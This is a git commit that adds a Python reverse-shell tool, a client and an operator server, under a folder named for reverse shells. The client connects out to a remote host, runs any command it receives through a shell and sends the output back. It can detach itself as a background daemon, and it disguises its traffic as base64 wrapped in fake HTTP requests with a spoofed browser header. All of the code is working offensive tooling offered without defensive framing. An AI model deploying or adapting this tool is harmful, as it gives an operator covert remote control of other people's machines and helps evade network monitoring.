3a1524bfb3e73d3e615c18a520efe4c8678d7a62
pangdoh <pang_doh@163.com>
2019-09-17 17:42:42 +0800

    1

---
+++ python/反弹shell/shell-2.0/client/client.py
@@ -0,0 +1,140 @@
+# -*- coding: utf-8 -*-
+import argparse
+import atexit
+import base64
+import os
+import socket
+import subprocess
+import sys
+import time
+
+
+# 进行连接
+def connection(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, int(port)))
+        print("已连接。。。。")
+        while True:
+            data = s.recv(4096)
+            try:
+                data = decryption_req(data).decode()
+                comRst = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE)
+                m_stdout, m_stderr = comRst.communicate()
+                rst = m_stdout.decode(sys.getfilesystemencoding()).encode()
+                s.send(encryption_req(rst))
+            except Exception as e:
+                s.send(encryption_req(str(e).encode()))
+
+            time.sleep(1)
+        s.close()
+    except Exception as e:
+        print(e)
+
+
+# 守护进程
+def daemonize(pid_file=None, **kwargs):
+    pid = os.fork()
+    if pid:
+        sys.exit(0)
+    os.chdir('/')
+    os.umask(0)
+    os.setsid()
+
+    _pid = os.fork()
+    if _pid:
+        sys.exit(0)
+
+    sys.stdout.flush()
+    sys.stderr.flush()
+    with open('/dev/null') as read_null, open('/dev/null', 'w') as write_null:
+        os.dup2(read_null.fileno(), sys.stdin.fileno())
+        os.dup2(write_null.fileno(), sys.stdout.fileno())
+        os.dup2(write_null.fileno(), sys.stderr.fileno())
+    if pid_file:
+        with open(pid_file, 'w+') as f:
+            f.write(str(os.getpid()))
+    atexit.register(os.remove, pid_file)
+
+    connection(kwargs.get('host'), kwargs.get('port'))
+
+
+# 加密
+def encryption_req(data):
+    # 可以采用任何加密或编码方式
+    data = base64.b64encode(data).decode()
+
+    sendData = "POST /pushdata"
+    sendData += "\r\n"
+    sendData += "HTTP/1.1"
+    sendData += "\r\n"
+    sendData += "Host: tazxuo.com"
+    sendData += "\r\n"
+    sendData += "Connection: close"
+    sendData += "\r\n"
+    sendData += "Upgrade-Insecure-Requests: 1"
+    sendData += "\r\n"
+    sendData += "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/32.13 (KHTML, like Gecko) Chrome/59.0.332.13 Safari/452.36"
+    sendData += "\r\n"
+    sendData += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
+    sendData += "\r\n"
+    sendData += "Accept-Language: en-US,en;q=0.9"
+    sendData += "\r\n"
+    sendData += "Accept-Encoding: gzip, deflate"
+    sendData += "\r\n"
+    sendData += "\r\n"
+    sendData += "stri0date=%s" % data
+    sendData += "\r\n"
+    sendData += "\r\n"
+    return sendData.encode()
+
+
+# 解密
+def decryption_req(data):
+    data = data.decode()
+    data = data[data.find("Connection: keep-alive\r\n\r\n") + 26:]
+    data = str(base64.b64decode(data), "utf-8")
+    return data.encode()
+
+
+if __name__ == '__main__':
+    # 命令行参数解析对象
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-host', dest='hostName', help='Host Name')
+    parser.add_argument('-port', dest='conPort', help='Host Port')
+    parser.add_argument('-reconnection', '-recon', dest='reconnection', type=int, nargs='?', default=0, help='Reconnection times. Up to 100 times.')
+    parser.add_argument('--daemon', nargs='?', default=False, help='Daemon Start')
+    # 解析命令行参数
+    args = parser.parse_args()
+    host = args.hostName
+    port = args.conPort
+    reconnection = args.reconnection
+    daemon = args.daemon
+
+    if host == None or port == None:
+        print('Required parameters: -host, -port.')
+        print('必须参数：-host、-port。')
+        print(parser.parse_args(['-h']))
+        exit(0)
+
+    if reconnection < 0:
+        reconnection = 0
+    for n in range(reconnection + 1):
+        if n > 0:
+            print("3秒后尝试重新连接(%d)..." % n)
+            time.sleep(3)
+
+        if daemon != False:
+            # 守护进程启动
+            import platform
+            import re
+
+            if re.search('Windows', platform.system(), re.IGNORECASE):
+                print('Windows system does not support daemon startup for the time being, and has switched to non-daemon mode.')
+                print('Windows系统暂不支持守护进程启动，已切换为非守护进程方式。')
+                connection(host, port)
+            else:
+                daemonize(host=host, port=port)
+        else:
+            connection(host, port)
---
+++ python/反弹shell/shell-2.0/server/server.py
@@ -0,0 +1,66 @@
+# -*- coding: utf-8 -*-
+import base64
+import socket
+import argparse
+import time
+
+def connection(s):
+    print('Waiting for connection......')
+    ss, addr = s.accept()
+    print('client %s is connection!' % (addr[0]))
+    print('print:\\!q for Disconnect')
+    while True:
+        cmd = input(str(addr[0]) + ':~#')
+        if cmd == '\\!q':
+            print('-- Disconnected --')
+            exit(0)
+        ss.send(encryption_res(cmd.encode()))
+        data = ss.recv(4096)
+        print(decryption_res(data).decode(), end='')
+
+def encryption_res(data):
+    # 可以采用任何加密或编码方式
+    data = base64.b64encode(data).decode()
+    # 对时间进行处理
+    date = time.strftime('%a, %d %b %Y %X GMT', time.localtime(time.time()))
+
+    sendData = "HTTP/1.1 200 OK"
+    sendData += "\r\n"
+    sendData += "Date: %s" % date
+    sendData += "\r\n"
+    sendData += "Content-Type: application/x-javascript"
+    sendData += "\r\n"
+    sendData += "Content-Length: %d" % len(data)
+    sendData += "\r\n"
+    sendData += "Connection: keep-alive"
+    sendData += "\r\n"
+    sendData += "\r\n"
+    sendData += "%s" % data
+    return sendData.encode()
+
+def decryption_res(data):
+    data = data.decode()
+    data = data[data.find("\r\n\r\nstri0date=") + 14:]
+    data = data[:data.find("\r\n\r\n")]
+    data = str(base64.b64decode(data), "utf-8")
+    return data.encode()
+
+if __name__ == '__main__':
+    # 命令行参数解析对象
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-host', dest='hostName', default='0.0.0.0', help='Host Name(default=0.0.0.0)')
+    parser.add_argument('-port', dest='conPort', default=1234, help='Host Port(default=1234)')
+    # 解析命令行参数
+    args = parser.parse_args()
+    host = args.hostName
+    port = args.conPort
+
+    if host == None or port == None:
+        print(parser.parse_args(['-h']))
+        exit(0)
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((host,port))
+    s.listen(512)
+    connection(s)
+
